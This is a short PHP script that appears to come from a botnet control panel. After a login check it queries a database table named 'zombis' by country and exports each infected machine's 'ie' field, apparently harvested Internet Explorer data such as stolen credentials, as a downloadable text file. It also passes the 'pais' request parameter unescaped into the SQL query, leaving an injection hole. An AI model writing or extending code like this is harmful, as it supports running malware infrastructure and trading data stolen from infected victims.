
<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php 
require_once('../../includes.php'); 

$InternetExplorer = $DB->Select("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'");	
for($i=0; $i<count($InternetExplorer); $i++){
	$InternetExplorertxt .= $InternetExplorer[$i]['ie'] . '
' ;
}

$Ramdon = substr(md5(uniqid(rand())),0,6);

$downloadfile="".$Ramdon."-".$_GET['pais']."-InternetExplorer.txt";

header("Content-disposition: attachment; filename=".$downloadfile."");
header("Content-Type: plain/text");
header("Content-Transfer-Encoding: binary");
header("Content-Length: ".strlen($InternetExplorertxt));
header("Pragma: no-cache");
header("Expires: 0");
echo $InternetExplorertxt ;
?>







